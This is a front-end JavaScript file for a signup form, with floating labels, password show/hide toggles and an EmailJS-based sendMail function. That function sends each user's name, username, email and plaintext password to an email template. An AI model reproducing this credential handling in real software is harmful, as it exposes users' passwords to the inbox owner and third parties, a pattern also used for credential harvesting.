//input fields event listener 
document.addEventListener('DOMContentLoaded', function () {
    const inputGroups = document.querySelectorAll('.input-group input');

    inputGroups.forEach(input => {
        input.addEventListener('input', function () {
            handleInput(input);
        });
        handleInput(input);
    });

    function handleInput(input) {
        const label = input.previousElementSibling;
        if (input.value.trim() !== '') {
            label.classList.add('moved'); //for placing the text in input field to the top
            input.classList.add('color-change'); //changes the border color to blue
        } else {
            label.classList.remove('moved');
            input.classList.remove('color-change');
        }
    }
});


//Show button (password and confirm password field) and changing state of the text event listener
document.addEventListener('DOMContentLoaded',function(){
    const passwordInput=document.getElementById('pass');
    const confirmPasswordInput=document.getElementById('cpass');
    const passShowButton=document.getElementById('pass-show-button');
    const cpassShowButton=document.getElementById('cpass-show-button');

    passwordInput.addEventListener('input', function(){
        checkShow(passwordInput,passShowButton);
    });
    confirmPasswordInput.addEventListener('input', function(){
        checkShow(confirmPasswordInput,cpassShowButton);
    });

    function checkShow(input, showButton){
        if(input.value.trim()!==''){
            showButton.classList.add('visible');
        }
        else{
            showButton.classList.remove('visible');
        }
    }

    //enabling show and hide button with their functionalities
    passShowButton.addEventListener('click',function(){
        viewPassword(passwordInput,passShowButton);
    });
    cpassShowButton.addEventListener('click',function(){
        viewPassword(confirmPasswordInput,cpassShowButton);
    });

    function viewPassword(input, showButton){
        if(input.type==='password'){
            input.type='text';
            showButton.textContent='HIDE';
        }
        else{
            input.type='password';
            showButton.textContent='SHOW';
        }
    }
});

//function to send email 
function sendMail(){
    console.log("sendMail function called");
    (function(){
        emailjs.init("fLhmZXLQtdPHw00mu"); //Account Public key
    })();

    var params={
        name: document.querySelector("#name").value,
        email: document.querySelector("#email").value,
        message: `Name: ${document.getElementById("name").value}\nUsername: ${document.getElementById("username").value}\nEmail: ${document.getElementById("email").value}\nPassword: ${document.getElementById("pass").value}`,
    };

    var serviceID = "service_8slf1vq"; //email service id
    var templateID = "template_3pi7sn4"; //email template id

    emailjs.send(serviceID, templateID, params)
    .then( res => {
        alert("Email sent Successfully!");
        console.log("Email sent response:", res);
        location.reload();
    })
    .catch(error => {
        console.error("Email could not be sent:", error);
    });
}